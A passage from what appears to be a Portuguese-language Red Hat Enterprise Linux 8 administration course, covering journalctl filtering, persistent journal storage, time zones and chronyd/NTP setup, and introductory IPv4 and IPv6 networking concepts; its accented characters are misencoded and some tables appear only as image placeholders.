_COMM √© o nome do comando _EXE √© o caminho para o execut√°vel do processo _PID √© a PID do processo _UID √© a UID do usu√°rio que est√° executando o processo _SYSTEMD_UNIT √© a unidade do systemd que iniciou o processo √â poss√≠vel combinar mais de um dos campos de di√°rio do sistema para formar uma consulta de pesquisa granular com o comando journalctl. Por exemplo, o comando journalctl a seguir mostra todas as entradas de di√°rio relacionadas √† unidade sshd.service systemd de um processo com PID 1182.
[root@host ~]# journalctl _SYSTEMD_UNIT=sshd.service _PID=1182 Apr 03 19:34:27 host.lab.example.com sshd[1182]: Accepted password for root from ::1 port 52778 ssh2 Apr 03 19:34:28 host.lab.example.com sshd[1182]: pam_unix(sshd:session): session opened for user root by (uid=0) &amp;hellip;output omitted&amp;hellip;
Nota
Para obter uma lista dos campos de di√°rio normalmente usados, consulte a p√°gina do man systemd.journal-fields(7).
Preserva√ß√£o do di√°rio do sistema Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de configurar o di√°rio do sistema para manter o registro dos eventos quando um servidor for reinicializado. Armazenamento permanente do di√°rio do sistema
Por padr√£o, os di√°rios do sistema s√£o mantidos no diret√≥rio /run/log/journal, o que significa que os di√°rios s√£o limpos quando o sistema √© reiniciado. Voc√™ pode alterar as configura√ß√µes do servi√ßo systemd-journald no arquivo /etc/systemd/journald.conf para manter os di√°rios ap√≥s as reinicializa√ß√µes.
O par√¢metro Storage no arquivo /etc/systemd/journald.conf define se os di√°rios do sistema devem ser armazenados de maneira vol√°til ou persistente nas reinicializa√ß√µes. Defina o par√¢metro como persistent, volatile, auto ou none desta forma:
persistent: armazena os di√°rios no diret√≥rio /var/log/journal, que √© mantido nas reinicializa√ß√µes. Se /var/log/journal n√£o existir, o servi√ßo systemd-journald criar√° o diret√≥rio. volatile: armazena os di√°rios no diret√≥rio /run/log/journal vol√°til. Como o sistema de arquivos /run √© tempor√°rio e existe somente na mem√≥ria de tempo de execu√ß√£o, os dados armazenados nele, inclusive os di√°rios do sistema, n√£o s√£o mantidos na reinicializa√ß√£o. auto: se o diret√≥rio /var/log/journal existir, systemd-journald usar√° o armazenamento persistente, caso contr√°rio, usar√° o armazenamento vol√°til. Essa ser√° a a√ß√£o padr√£o se o par√¢metro Storage n√£o estiver definido. none: n√£o usa nenhum armazenamento. Todos os logs ser√£o descartados, mas o encaminhamento de log ainda funcionar√° conforme o esperado. A vantagem dos di√°rios do sistema persistente √© que os dados hist√≥ricos s√£o disponibilizados imediatamente no boot. No entanto, mesmo com um di√°rio persistente, nem todos os dados s√£o mantidos para sempre. O di√°rio tem um mecanismo integrado de rod√≠zio de logs que √© acionado mensalmente. Al√©m disso, por padr√£o, o di√°rio n√£o pode ocupar mais de 10% do sistema de arquivos em que reside nem deixar menos de 15% do sistema de arquivos livre. Esses valores podem ser ajustados para os di√°rios de tempo de execu√ß√£o e persistentes em /etc/systemd/journald.conf. Os limites atuais de tamanho do di√°rio s√£o registrados em log quando o processo systemd-journald √© iniciado. A seguinte sa√≠da do comando mostra as entradas de di√°rio que refletem os limites atuais de tamanho:
[user@host ~]$ journalctl | grep -E &amp;lsquo;Runtime|System journal&amp;rsquo; Feb 25 13:01:46 localhost systemd-journald[147]: Runtime journal (/run/log/journal/ae06db7da89142138408d77efea9229c) is 8.0M, max 91.4M, 83.4M free. Feb 25 13:01:48 remotehost.lab.example.com systemd-journald[548]: Runtime journal (/run/log/journal/73ab164e278e48be9bf80e80714a8cd5) is 8.0M, max 91.4M, 83.4M free. Feb 25 13:01:48 remotehost.lab.example.com systemd-journald[548]: System journal (/var/log/journal/73ab164e278e48be9bf80e80714a8cd5) is 8.0M, max 3.7G, 3.7G free. Feb 25 13:01:48 remotehost.lab.example.com systemd[1]: Starting Tell Plymouth To Write Out Runtime Data&amp;hellip; Feb 25 13:01:48 remotehost.lab.example.com systemd[1]: Started Tell Plymouth To Write Out Runtime Data.
Nota
Acima, em grep, o s√≠mbolo de barra vertical (|) age como um operador ou, isto √©, grep corresponde a qualquer linha que contenha a string Runtime ou System journal na sa√≠da de journalctl. Ele busca os limites atuais de tamanho do armazenamento vol√°til de di√°rios (Runtime), bem como do armazenamento persistente (System).
Configura√ß√£o de di√°rios do sistema persistentes
Para configurar o servi√ßo systemd-journald de modo a manter os di√°rios do sistema de forma persistente nas reinicializa√ß√µes, defina Storage como persistent no arquivo /etc/systemd/journald.conf. Execute o editor de texto de sua escolha como superusu√°rio para editar arquivo /etc/systemd/journald.conf.
[Journal] Storage=persistent &amp;hellip;output omitted&amp;hellip;
Depois de editar o arquivo de configura√ß√£o, reinicie o servi√ßo systemd-journald para que as altera√ß√µes de configura√ß√£o entrem em vigor.
[root@host ~]# systemctl restart systemd-journald
Se o servi√ßo systemd-journald for reiniciado com √™xito, voc√™ ver√° que o diret√≥rio /var/log/journal foi criado e cont√©m um ou mais subdiret√≥rios. Esses subdiret√≥rios t√™m caracteres hexadecimais em seus nomes longos e cont√™m arquivos *.journal. Os arquivos *.journal s√£o os arquivos bin√°rios que armazenam as entradas de di√°rio estruturadas e indexadas.
[root@host ~]# ls /var/log/journal 73ab164e278e48be9bf80e80714a8cd5 [root@host ~]# ls /var/log/journal/73ab164e278e48be9bf80e80714a8cd5 system.journal user-1000.journal
Embora os di√°rios do sistema sejam mantidos na reinicializa√ß√£o, voc√™ recebe um grande n√∫mero de entradas na sa√≠da do comando journalctl, incluindo entradas da inicializa√ß√£o do sistema atual e das anteriores. Para limitar a sa√≠da a uma inicializa√ß√£o espec√≠fica do sistema, use a op√ß√£o -b com o comando journalctl. O seguinte comando journalctl recupera as entradas da primeira inicializa√ß√£o do sistema:
[root@host ~]# journalctl -b 1 &amp;hellip;output omitted&amp;hellip;
O comando journalctl a seguir recupera as entradas do segundo boot do sistema. Este argumento ser√° relevante apenas se o sistema tiver sido reinicializado pelo menos duas vezes:
[root@host ~]# journalctl -b 2
O seguinte comando journalctl recupera as entradas do boot atual do sistema:
[root@host ~]# journalctl -b
Nota
Ao depurar uma falha do sistema com um di√°rio persistente, normalmente √© necess√°rio limitar a consulta do di√°rio √† reinicializa√ß√£o anterior √† falha. A op√ß√£o -b pode estar acompanhada de um n√∫mero negativo, indicando quantas inicializa√ß√µes anteriores do sistema o resultado deve incluir. Por exemplo, journalctl -b -1 limita o resultado apenas √† inicializa√ß√£o anterior.
Manuten√ß√£o de hora precisa Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de manter a sincroniza√ß√£o de hora precisa usando NTP e configurar o fuso hor√°rio para garantir data e hora corretas nos eventos registrados pelos logs e pelo di√°rio do sistema. Defini√ß√£o do fuso hor√°rio local e dos rel√≥gios locais
Ter a hora do sistema sincronizada e correta √© essencial para a an√°lise de arquivos de log em v√°rios sistemas. O Network Time Protocol (NTP) √© uma forma padr√£o na qual as m√°quinas fornecem e obt√™m informa√ß√µes corretas de hora na Internet. Uma m√°quina pode obter informa√ß√µes precisas de hora por meio de servi√ßos NTP p√∫blicos na Internet, como o NTP Pool Project. Um rel√≥gio de hardware de alta qualidade para fornecer a hora precisa para clientes locais √© outra op√ß√£o.
O comando timedatectl mostra uma vis√£o geral das configura√ß√µes do sistema com rela√ß√£o √† hora, incluindo a hora atual, o fuso hor√°rio e as configura√ß√µes de sincroniza√ß√£o de NTP do sistema.
[user@host ~]$ timedatectl Local time: Fri 2019-04-05 16:10:29 CDT Universal time: Fri 2019-04-05 21:10:29 UTC RTC time: Fri 2019-04-05 21:10:29 Time zone: America/Chicago (CDT, -0500) System clock synchronized: yes NTP service: active RTC in local TZ: no
Um banco de dados de fusos hor√°rios est√° dispon√≠vel e pode ser listado usando o comando timedatectl list-timezones.
[user@host ~]$ timedatectl list-timezones Africa/Abidjan Africa/Accra Africa/Addis_Ababa Africa/Algiers Africa/Asmara Africa/Bamako &amp;hellip;
Nomes de fusos hor√°rios s√£o baseados no banco de dados p√∫blico mantido pela IANA. Os fusos hor√°rios s√£o nomeados com base no continente ou no oceano, geralmente seguidos, por√©m nem sempre, da maior cidade dentro da regi√£o do fuso hor√°rio. Por exemplo, a maior parte do fuso hor√°rio MT (Mountain time) dos EUA √© America/Denver.
Selecionar o nome correto poder√° ser contraintuitivo em casos nos quais as localidades dentro do fuso hor√°rio t√™m regras diferentes para o hor√°rio de ver√£o. Por exemplo, nos EUA, grande parte do Estado do Arizona (MT) n√£o tem ajuste algum no hor√°rio de ver√£o e se encontra no fuso hor√°rio America/Phoenix.
O comando tzselect √© √∫til para identificar nomes corretos de fusos hor√°rios no zoneinfo. Ele faz perguntas de modo interativo ao usu√°rio sobre o local do sistema e mostra o nome do fuso hor√°rio correto. Ele n√£o faz altera√ß√µes na configura√ß√£o de fuso hor√°rio do sistema.
O superusu√°rio pode alterar a configura√ß√£o do sistema para atualizar o fuso hor√°rio usando o comando timedatectl set-timezone. O comando timedatectl a seguir atualiza o fuso hor√°rio atual para America/Phoenix.
[root@host ~]# timedatectl set-timezone America/Phoenix [root@host ~]# timedatectl Local time: Fri 2019-04-05 14:12:39 MST Universal time: Fri 2019-04-05 21:12:39 UTC RTC time: Fri 2019-04-05 21:12:39 Time zone: America/Phoenix (MST, -0700) System clock synchronized: yes NTP service: active RTC in local TZ: no
Nota
Se voc√™ precisar usar UTC (Coordinated Universal Time) em um determinado servidor, defina o fuso hor√°rio como UTC. O comando tzselect n√£o inclui o nome do fuso hor√°rio UTC. Use o comando timedatectl set-timezone UTC para definir o fuso hor√°rio atual do sistema como UTC.
Use o comando timedatectl set-time para alterar o hor√°rio atual do sistema. O tempo √© especificado no formato &amp;ldquo;AAAA-MM-DD hh:mm:ss&amp;rdquo;, no qual √© poss√≠vel omitir a data ou a hora. O comando timedatectl a seguir altera o hor√°rio para 09:00:00.
[root@host ~]# timedatectl set-time 9:00:00 [root@host ~]# timedatectl Local time: Fri 2019-04-05 09:00:27 MST Universal time: Fri 2019-04-05 16:00:27 UTC RTC time: Fri 2019-04-05 16:00:27 Time zone: America/Phoenix (MST, -0700) System clock synchronized: yes NTP service: active RTC in local TZ: no
O comando timedatectl set-ntp ativa ou desativa a sincroniza√ß√£o de NTP para ajuste autom√°tico de hora. A op√ß√£o requer um argumento true ou false para ser ativada ou desativada. O comando timedatectl a seguir ativa a sincroniza√ß√£o de NTP.
[root@host ~]# timedatectl set-ntp true
Nota
No Red Hat Enterprise Linux 8, o comando timedatectl set-ntp ajustar√° se o servi√ßo NTP chronyd est√° operando ou n√£o. Outras distribui√ß√µes do Linux podem usar essa configura√ß√£o para ajustar um servi√ßo NTP ou SNTP diferente.
Ativar ou desativar o NTP usando outros utilit√°rios no Red Hat Enterprise Linux, como no aplicativo Settings do GNOME gr√°fico, tamb√©m atualiza essa configura√ß√£o. Configura√ß√£o e monitoramento do chronyd
O rel√≥gio de hardware local (RTC), que normalmente √© impreciso, √© mantido atualizado pelo servi√ßo chronyd, que o sincroniza com os servidores NTP configurados. Se n√£o houver conectividade de rede dispon√≠vel, chronyd calcular√° o desvio de tempo do RTC, que √© gravado no driftfile especificado no arquivo de configura√ß√£o /etc/chrony.conf.
Por padr√£o, o servi√ßo chronyd usa servidores do NTP Pool Project para a sincroniza√ß√£o de hor√°rio e n√£o precisa de configura√ß√µes adicionais. Ele pode ser √∫til para alterar os servidores NTP quando a m√°quina em quest√£o estiver em uma rede isolada.
A camada da fonte de tempo do NTP determina sua qualidade. A camada determina o n√∫mero de saltos que a m√°quina est√° em rela√ß√£o a um rel√≥gio de refer√™ncia de alto desempenho. O rel√≥gio de refer√™ncia √© uma fonte de tempo stratum 0. Um servidor NTP diretamente anexado a ele √© um stratum 1, enquanto uma m√°quina que esteja sincronizando a hora de acordo com o servidor NTP √© uma fonte de tempo stratum 2.
server e par s√£o as duas categorias de fontes de tempo que podem ser alteradas no arquivo de configura√ß√£o /etc/chrony.conf. A categoria server fica um estrato acima do servidor NTP local, e a peer fica no mesmo n√≠vel de camada. Mais de um servidor e mais de um par podem ser especificados, sendo um por linha.
O primeiro argumento da linha server √© o endere√ßo IP ou o nome DNS do servidor NTP. Depois do endere√ßo IP ou do nome do servidor, uma s√©rie de op√ß√µes para o servidor pode ser exibida. √â recomend√°vel usar a op√ß√£o iburst, porque depois que o servi√ßo √© iniciado, quatro medidas s√£o obtidas em um curto per√≠odo de tempo para uma sincroniza√ß√£o inicial de rel√≥gio mais precisa.
A linha server classroom.example.com iburst a seguir no arquivo /etc/chrony.conf faz com que o servi√ßo chronyd use a fonte de tempo do NTP classroom.example.com.
Use public servers from the pool.ntp.org project. &amp;hellip;output omitted&amp;hellip; server classroom.example.com iburst &amp;hellip;output omitted&amp;hellip;
Depois de apontar chronyd para a fonte de tempo local, classroom.example.com, voc√™ dever√° reiniciar o servi√ßo.
[root@host ~]# systemctl restart chronyd
O comando chronyc atua como um cliente para o servi√ßo chronyd. Depois de definir a sincroniza√ß√£o do NTP, verifique se o sistema local est√° usando o servidor NTP para sincronizar o rel√≥gio do sistema usando o comando chronyc sources. Para obter um resultado mais descritivo e com explica√ß√µes adicionais sobre a sa√≠da, use o comando chronyc sources -v.
[root@host ~]# chronyc sources -v 210 Number of sources = 1
.&amp;ndash; Source mode &amp;lsquo;^&amp;rsquo; = server, &amp;lsquo;=&amp;rsquo; = peer, &amp;lsquo;#&amp;rsquo; = local clock. / .- Source state &amp;lsquo;*&amp;rsquo; = current synced, &amp;lsquo;&#43;&amp;rsquo; = combined , &amp;lsquo;-&amp;rsquo; = not combined, | / &amp;lsquo;?&amp;rsquo; = unreachable, &amp;lsquo;x&amp;rsquo; = time may be in error, &amp;lsquo;~&amp;rsquo; = time too variable. || .- xxxx [ yyyy ] &#43;/- zzzz || / xxxx = adjusted offset, || Log2(Polling interval) -. | yyyy = measured offset, || \ | zzzz = estimated error. || | | MS Name/IP address Stratum Poll Reach LastRx Last sample ^* classroom.example.com 8 6 17 23 -497ns[-7000ns] &#43;/- 956us
O caractere * no campo S (estado de origem) indica que o servidor classroom.example.com foi usado como uma fonte de tempo e que √© o servidor NTP com o qual a m√°quina est√° atualmente sincronizada.
Cap√≠tulo 12. Gerenciamento de redes Descri√ß√£o de conceitos de rede
Liste recursos de rede do computador. Objetivos
Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de descrever os conceitos fundamentais de endere√ßamento e roteamento de redes de um servidor. Modelo de rede TCP/IP
O modelo de rede TCP/IP √© um conjunto de abstra√ß√µes simplificado em quatro camadas que descreve como diferentes protocolos interagem para que os computadores enviem tr√°fego de uma m√°quina para outra pela Internet. √â especificado no RFC 1122: Requisitos para hosts de Internet ‚Äì camadas de comunica√ß√£o. As quatro camadas s√£o:
Aplicativo Cada aplicativo tem especifica√ß√µes de comunica√ß√£o, para que os clientes e os servidores possam se comunicar entre plataformas. Os protocolos comuns incluem SSH (login remoto), HTTPS (Web segura), NFS ou CIFS (compartilhamento de arquivos) e a SMTP (distribui√ß√£o eletr√¥nica de e-mail). Transporte Os protocolos de transporte s√£o TCP e UDP. O protocolo TCP √© uma comunica√ß√£o confi√°vel orientada a conex√µes, mas o UDP √© um protocolo de datagrama sem corre√ß√£o. Os protocolos de aplicativos usam portas TCP ou UDP. Uma lista de portas conhecidas e registradas pode ser encontrada no arquivo /etc/services. Quando um pacote √© enviado na rede, a combina√ß√£o da porta de servi√ßo e do endere√ßo IP forma um soquete. Cada pacote tem um soquete de origem e um soquete de destino. Essas informa√ß√µes poder√£o ser usadas durante o monitoramento e a filtragem. Internet A Internet, ou a camada de rede, carrega os dados do host de origem para o host de destino. Os protocolos IPv4 e IPv6 s√£o protocolos de camada de Internet. Cada host tem um endere√ßo IP e um prefixo usados para determinar endere√ßos de rede. Os roteadores s√£o usados para conectar as redes. Link A camada de link, ou o acesso a m√≠dias, fornece a conex√£o a m√≠dias f√≠sicas. Os tipos de redes mais comuns s√£o ethernet cabeada (802.3) e WLAN sem fio (802.11). Cada dispositivo f√≠sico tem um endere√ßo de hardware (MAC) que √© usado para identificar o destino dos pacotes no segmento da rede local. tcp-ip-model-vs-osi-model.svg
Descri√ß√£o dos nomes de interfaces de rede
Cada porta de rede de um sistema tem um nome usado para configur√°-lo e identific√°-lo.
As vers√µes mais antigas do Red Hat Enterprise Linux usavam nomes como eth0, eth1 e eth2 para cada interface de rede. O nome eth0 era a primeira porta de rede detectada pelo sistema operacional, eth1 era a segunda e assim por diante. No entanto, √† medida que eram adicionados e removidos dispositivos, o mecanismo que detectava os dispositivos e definia seus nomes podia mudar qual interface receberia que nome. Al√©m disso, o padr√£o PCIe n√£o garante a ordem na qual os dispositivos PCIe ser√£o detectados no boot, o que pode alterar a nomenclatura do dispositivo inesperadamente devido a varia√ß√µes durante a inicializa√ß√£o do dispositivo ou do sistema.
As vers√µes mais recentes do Red Hat Enterprise Linux usam um sistema de nomenclatura diferente. Em vez de se basear na ordem de detec√ß√£o, os nomes das interfaces de rede s√£o atribu√≠dos com base nas informa√ß√µes do firmware, na topologia do barramento PCI e no tipo de dispositivo de rede.
Os nomes das interfaces de rede come√ßam com o tipo de interface:
As interfaces de ethernet come√ßam com en As interfaces de WLAN come√ßam com wl As interfaces de WWAN come√ßam com ww O restante do nome da interface ap√≥s o tipo ser√° baseado nas informa√ß√µes fornecidas pelo firmware do servidor ou determinado pela localiza√ß√£o do dispositivo na topologia do PCI.
oN indica que esse √© um dispositivo inicial e que o n√∫mero de √≠ndice fornecido pelo firmware do servidor √© N para o dispositivo. Assim, eno1 √© o dispositivo 1 inicial de ethernet. Muitos servidores n√£o fornecem essas informa√ß√µes. sN indica que esse dispositivo est√° no slot hotplug PCI N. Assim, ens3 √© uma placa de ethernet no slot hotplug PCI 3. pMsN indica que esse [e um dispositivo PCI no barramento M no slot N. Assim, wlp4s0 √© uma placa WLAN no barramento PCI 4 no slot 0. Se a placa for um dispositivo multifuncional (poss√≠vel com uma placa de ethernet com v√°rias portas, ou dispositivos que tenham ethernet mais algum outro recurso), voc√™ poder√° ver fN adicionado ao nome do dispositivo. Assim, enp0s1f0 √© a fun√ß√£o 0 da placa de ethernet no barramento 0 no slot 1. Tamb√©m pode haver uma segunda interface chamada enp0s1f1, a fun√ß√£o 1 desse mesmo dispositivo. A nomenclatura persistente significa que, uma vez que voc√™ sabe qual √© o nome de uma interface de rede no sistema, tamb√©m sabe que ela n√£o ser√° alterada posteriormente. A desvantagem √© que voc√™ n√£o pode assumir que um sistema com uma interface nomear√° essa interface eth0 . Redes IPv4
IPv4 √© o principal protocolo de rede usado na Internet atualmente. Voc√™ precisa ter pelo menos a compreens√£o b√°sica da rede IPv4 para gerenciar a comunica√ß√£o de redes em seus servidores.
Endere√ßos IPv4
Um endere√ßo IPv4 √© um n√∫mero de 32 bits, normalmente expresso em base decimal como quatro octetos de 8 bits com valores de 0 a 255, separados por pontos. O endere√ßo √© dividido em duas partes: a parte da rede e a parte do host. Todos os hosts na mesma sub-rede que podem se comunicar entre si diretamente sem um roteador t√™m a mesma parte de rede. Essa parte indica a sub-rede. N√£o pode haver mais de um host na sub-rede com a mesma parte de host. A parte de host identifica um host espec√≠fico em uma sub-rede.
Na Internet moderna, o tamanho de uma sub-rede IPv4 pode variar. Para saber qual parte de um endere√ßo IPv4 √© da rede e qual √© a parte do host, o administrador precisa saber que m√°scara de rede est√° atribu√≠da √† sub-rede. A m√°scara de rede indica quantos bits do endere√ßo IPv4 pertencem √† sub-rede. Quanto mais bits estiverem dispon√≠veis para a parte do host, maior ser√° o n√∫mero de hosts poss√≠veis na sub-rede.
O menor endere√ßo poss√≠vel em uma sub-rede (a parte de host preenchida por zeros em bin√°rio) √†s vezes √© chamado de endere√ßo de rede. O maior endere√ßo poss√≠vel em uma sub-rede (a parte de host toda em n√∫mero um em bin√°rio) √© usado para transmitir mensagens de transmiss√£o no IPv4 e √© chamado de endere√ßo de transmiss√£o.
As m√°scaras de rede s√£o expressas de duas formas. A sintaxe mais antiga de m√°scara de rede usa 24 bits para a parte da rede e exibe 255.255.255.0. Uma nova sintaxe, chamada de nota√ß√£o CIDR, especifica um prefixo de rede de /24. Ambas as formas carregam as mesmas informa√ß√µes; especificamente, quantos bits √† esquerda no endere√ßo IP contribuem para seu endere√ßo de rede.
Os exemplos a seguir ilustram como o endere√ßo IP, o prefixo (m√°scara de rede), a parte da rede e a parte do host est√£o relacionados.
ipv4prefix.svg
Tabela 12.1. C√°lculo do endere√ßo de rede para 192.168.1.107/24
table_save_1.png
Tabela 12.2. C√°lculo do endere√ßo de rede para 10.1.1.18/8
table_save_2.png
Tabela 12.3. C√°lculo do endere√ßo de rede para 172.16.181.23/19
table_save_3.png
O endere√ßo especial 127.0.0.1 sempre aponta para o sistema local (‚Äúlocalhost‚Äù), e a rede 127.0.0.0/8 pertence ao sistema local, para que ele possa se comunicar consigo mesmo usando protocolos de rede.
Roteamento IPv4
Seja com IPv4 ou IPv6, o tr√°fego da rede precisa se mover de host para host e de rede para rede. Cada host tem uma tabela de roteamento que diz a ele como rotear o tr√°fego para redes espec√≠ficas. Uma entrada da tabela de roteamento mostra uma rede de destino, qual interface deve ser usada ao enviar o tr√°fego e o endere√ßo IP de qualquer roteador intermedi√°rio necess√°rio para retransmitir a mensagem a seu destino final. A entrada da tabela de roteamento que corresponde ao destino do tr√°fego de rede √© usada para rote√°-la. Se dois itens se corresponderem, o que tiver o prefixo mais longo ser√° usado.
Se o tr√°fego de rede n√£o corresponder a uma rota mais espec√≠fica, normalmente a tabela de roteamento ter√° uma entrada de rota padr√£o para toda a Internet com IPv4: 0.0.0.0/0. Essa rota padr√£o aponta para um roteador em uma sub-rede acess√≠vel (ou seja, em uma sub-rede que tenha uma rota mais espec√≠fica na tabela de roteamento do host).
Se um roteador receber tr√°fego n√£o endere√ßado a ele, em vez de ignor√°-lo como um host normal, ele o encaminhar√° com base em sua pr√≥pria tabela de roteamento. Isso poder√° enviar o tr√°fego diretamente para o host de destino (se o roteador por acaso estiver na sub-rede de destino) ou ele poder√° ser encaminhado para outro roteador. Esse processo de encaminhamento continua at√© que o tr√°fego atinja o destino final.
ip4network.svg
Tabela 12.4. Exemplo de tabela de roteamento
table_save_4.png
Neste exemplo, o tr√°fego direcionado para o endere√ßo IP 192.0.2.102 desse host √© transmitido diretamente para o destino pela interface sem fio wlo1, pois √© o que melhor corresponde √† rota 192.0.2.0/24. O tr√°fego do endere√ßo IP 192.168.5.3 √© transmitido diretamente para esse destino pela interface Ethernet enp3s0, pois √© o que melhor corresponde √† rota 192.168.5.0/24.
O tr√°fego para o endere√ßo IP 10.2.24.1 √© transmitido sem a interface Ethernet enp3s0 para um roteador em 192.168.5.254, que encaminha esse tr√°fego a seu destino final. Esse tr√°fego √© o que melhor corresponde √† rota 0.0.0.0/0, pois n√£o existe uma rota mais espec√≠fica na tabela de roteamento desse host. O roteador usa sua pr√≥pria tabela de roteamento para determinar aonde encaminhar esse tr√°fego a seguir.
Configura√ß√£o do endere√ßo IPv4 e da rota
Um servidor pode definir automaticamente suas configura√ß√µes de rede IPv4 no momento da inicializa√ß√£o de um servidor DHCP. Um daemon de cliente local consulta o link das configura√ß√µes de um servidor e da rede e obt√©m uma concess√£o para usar essas configura√ß√µes por um per√≠odo espec√≠fico. Se o cliente n√£o solicitar a renova√ß√£o da concess√£o periodicamente, poder√° perder suas configura√ß√µes de rede.
Como alternativa, voc√™ pode configurar um servidor para usar a configura√ß√£o de rede est√°tica. Nesse caso, as configura√ß√µes de rede s√£o lidas nos arquivos de configura√ß√£o locais. Voc√™ deve obter as configura√ß√µes corretas do administrador da rede e atualiz√°-las manualmente, conforme necess√°rio, para evitar conflitos com outros servidores. Redes IPv6
IPv6 destina-se a ser um substituto eventual do protocolo de rede IPv4. Voc√™ precisa entender como ele funciona devido ao crescente n√∫mero de sistemas de produ√ß√£o que usam endere√ßamento IPv6. Por exemplo, muitos ISPs j√° usam IPv6 para comunica√ß√£o interna e redes de gerenciamento de dispositivos, a fim de preservar os escassos endere√ßos IPv4 para fins relacionados aos clientes.
IPv6 tamb√©m pode ser usado em paralelo com IPv4 em um modelo de pilha dual. Nessa configura√ß√£o, uma interface de rede pode ter um endere√ßo ou endere√ßos IPv6, bem como endere√ßos IPv4. O Red Hat Enterprise Linux opera no modo de pilha dual por padr√£o.
Endere√ßos IPv6
Um endere√ßo IPv6 √© um n√∫mero de 128 bits, normalmente expresso como oito grupos separados por dois-pontos de quatro nibbles (semibytes) hexadecimais. Cada nibble representa quatro bits do endere√ßo IPv6, de modo que cada grupo representa 16 bits do endere√ßo IPv6.
2001:0db8:0000:0010:0000:0000:0000:0001
Para facilitar a grava√ß√£o de endere√ßos IPv6, os zeros √† esquerda em um grupo separado por dois-pontos n√£o precisam ser gravados. No entanto, pelo menos um d√≠gito hexadecimal deve ser gravado em cada grupo separado por dois-pontos.
2001:db8:0:10:0:0:0:1
J√° que os endere√ßos com cadeias longas de zeros s√£o comuns, um ou mais grupos consecutivos de zeros podem ser combinados com exatamente um bloco ::.
2001:db8:0:10::1
Observe que, sob essas regras, 2001:db8::0010:0:0:0:1 seria outra maneira menos conveniente de gravar o exemplo de endere√ßo. Por√©m, essa √© uma representa√ß√£o v√°lida do mesmo endere√ßo, e isso pode confundir os administradores novos em IPv6. Algumas dicas para gravar endere√ßos que podem ser lidos consistentemente:
Elimine os zeros √† esquerda de um grupo. Use :: para encurtar o m√°ximo poss√≠vel. Se um endere√ßo contiver dois grupos consecutivos de zeros, iguais em comprimento, √© prefer√≠vel encurtar os grupos de zeros mais √† esquerda para :: e os grupos mais √† direita para :0: em cada grupo. Embora isso seja permitido, n√£o use :: para encurtar um grupo de zeros. Em vez disso, use :0: e deixe :: para grupos consecutivos de zeros. Sempre use letras min√∫sculas para n√∫meros hexadecimais de a at√© f. Importante
Ao incluir a porta de rede TCP ou UDP depois de um endere√ßo IPv6, sempre anexe o endere√ßo IPv6 em colchetes de modo que a porta pare√ßa fazer parte dele.
Sub-redes IPv6
Um endere√ßo unicast IPv6 normal √© dividido em duas partes: o prefixo de rede e a ID da interface. O prefixo de rede identifica a sub-rede. N√£o existe a possibilidade de duas interfaces de rede na mesma sub-rede terem a mesma ID de interface; a ID de interface identifica as amea√ßas de uma interface particular na sub-rede.
Diferentemente de IPv4, IPv6 tem uma m√°scara de sub-rede padr√£o que √© usada para praticamente todos os endere√ßos normais, /64. Nesse caso, metade do endere√ßo √© o prefixo da rede, e metade √© a ID de interface. Isso significa que uma √∫nica sub-rede pode conter tantos hosts quanto necess√°rios.
Normalmente, o fornecedor de rede alocar√° um prefixo mais curto a uma organiza√ß√£o, como /48. Isso deixa o restante da parte da rede para atribui√ß√£o de sub-redes (sempre de tamanho /64) a partir do prefixo alocado. Para uma aloca√ß√£o /48, que deixa 16 bits para sub-redes (at√© 65.536 sub-redes).
ipv6-subnets-plain-fit.png
Tabela 12.5. Endere√ßos e redes IPv6 comuns
table_save_5.png
Importante
A tabela acima lista as aloca√ß√µes de endere√ßos de rede que s√£o reservadas para fins espec√≠ficos. Essas aloca√ß√µes podem consistir em muitas redes diferentes. Lembre-se de que as redes IPv6 alocadas a partir de espa√ßos unicast global e unicast link-local t√™m uma m√°scara de sub-rede padr√£o /64.
Um endere√ßo link-local no IPv6 √© um endere√ßo n√£o rote√°vel usado somente para se comunicar com os hosts em um link de rede espec√≠fico. Cada interface de rede no sistema √© configurada automaticamente com um endere√ßo link-local na rede fe80::/64. Para garantir que seja exclusiva, a ID de interface do endere√ßo link-local √© constru√≠da a partir do endere√ßo de hardware da Ethernet da interface de rede. O procedimento comum para converter o endere√ßo MAC de 48 bits em uma ID de interface de 64 bits √© inverter o bit 7 do endere√ßo MAC e inserir ff:fe entre seus dois bytes intermedi√°rios.
Prefixo de rede: fe80::/64 Endere√ßo MAC: 00:11:22:aa:bb:cc Endere√ßo link-local: fe80::211:22ff:feaa:bbcc/64 Os endere√ßos link-local de outras m√°quinas podem ser usados como endere√ßos normais por outros hosts no mesmo link. Como cada link tem uma rede fe80::/64 nele, a tabela de roteamento n√£o pode ser usada para selecionar a interface de sa√≠da corretamente. O link para usar ao falar com um endere√ßo link-local deve ser especificado com um identificador de escopo no final do endere√ßo. O identificador de escopo consiste em % seguido pelo nome da interface de rede.
Por exemplo, para usar ping6 para fazer ping no endere√ßo link-local fe80::211:22ff:feaa:bbcc usando o link conectado √† interface de rede ens3, a sintaxe correta do comando √©:
[user@host ~]$ ping6 fe80::211:22ff:feaa:bbcc%ens3
Nota
Os identificadores de escopo s√£o necess√°rios apenas quando os endere√ßos de contato t√™m o escopo ‚Äúlink‚Äù. Os endere√ßos globais normais s√£o usados como no IPv4, selecionando as interfaces de sa√≠da na tabela de roteamento.
Multicast permite que um sistema envie tr√°fego para um endere√ßo IP espec√≠fico recebido por v√°rios sistemas. √â diferente da transmiss√£o, pois apenas sistemas espec√≠ficos na rede recebem o tr√°fego. Tamb√©m √© diferente da transmiss√£o em IPv4, j√° que parte do tr√°fego multicast pode ser roteado para outras sub-redes, dependendo da configura√ß√£o de seus sistemas e roteadores de rede.
Multicast exerce uma fun√ß√£o maior no IPv6 do que no IPv4 porque n√£o existe um endere√ßo de transmiss√£o em IPv6. Um endere√ßo multicast importante no IPv6 √© ff02::1, o endere√ßo link-local de all-nodes. Fazer ping desse endere√ßo envia o tr√°fego a todos os n√≥s no link. Os endere√ßos multicast link-scope (iniciando com ff02::/8) precisam ser especificados com um identificador de escopo, assim como um endere√ßo link-local.
